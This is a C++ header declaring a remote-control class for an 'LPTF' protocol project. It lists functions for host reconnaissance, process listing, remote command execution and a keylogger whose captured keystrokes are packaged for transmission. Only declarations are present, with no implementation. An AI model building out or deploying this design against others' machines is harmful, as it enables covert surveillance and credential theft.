#ifndef REMOTE_CONTROL_HPP
#define REMOTE_CONTROL_HPP

#include "../protocole/LPTF_Protocol.hpp"
#include <string>
#include <vector>
#include <memory>
#include <thread>
#include <atomic>
#include <chrono>

struct ProcessInfo {
    int pid;
    std::string name;
    std::string command;
    float cpu_usage;
    long memory_usage;
};

struct HostInfo {
    std::string hostname;
    std::string username;
    std::string os_name;
    std::string os_version;
    std::string architecture;
};

class RemoteControl {
private:
    std::atomic<bool> keylogger_active_;
    std::unique_ptr<std::thread> keylogger_thread_;
    std::string keylog_buffer_;
    
public:
    RemoteControl();
    ~RemoteControl();
    
    // Host information
    HostInfo get_host_info();
    LPTF::LPTF_Packet create_host_info_response(const HostInfo& info);
    
    // Process management
    std::vector<ProcessInfo> get_process_list();
    LPTF::LPTF_Packet create_process_list_response(const std::vector<ProcessInfo>& processes);
    
    // Command execution
    std::string execute_command(const std::string& command);
    LPTF::LPTF_Packet create_command_response(const std::string& output, int exit_code);
    
    // Keylogger
    bool start_keylogger();
    bool stop_keylogger();
    std::string get_captured_keys();
    LPTF::LPTF_Packet create_keylogger_data(const std::string& keys);
    LPTF::LPTF_Packet create_keylogger_status_response(bool active, const std::string& message);
    
private:
    void keylogger_worker();
    std::string get_os_info();
    std::string get_username();
    std::string get_hostname();
};

#endif // REMOTE_CONTROL_HPP
